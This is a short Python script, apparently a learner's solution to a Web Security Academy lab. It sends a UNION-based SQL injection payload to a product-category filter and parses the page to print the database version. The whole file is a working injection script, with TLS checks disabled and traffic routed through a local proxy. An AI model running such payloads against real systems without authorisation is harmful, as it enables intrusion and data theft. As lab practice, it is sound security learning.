# My first working scripting without any input from anyone.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_version_finder(url):
    # url + path + payload
    # expected url: "https://ac471fc21e47d660c0126df1002c003a.web-security-academy.net"
    path = "/filter?category=Lifestyle"
    sql_payload = "' UNION SELECT NULL, @@version%23"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    my_regex = re.compile(r"\d{1,2}\.\d{1,2}\.\d{1,2}.*")
    versions = soup.find_all(text=my_regex)
    for version in versions:
        print("The database version is: ", version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("Searching for the database version...")
    if not sqli_version_finder(url):
        print("Database version not found..")
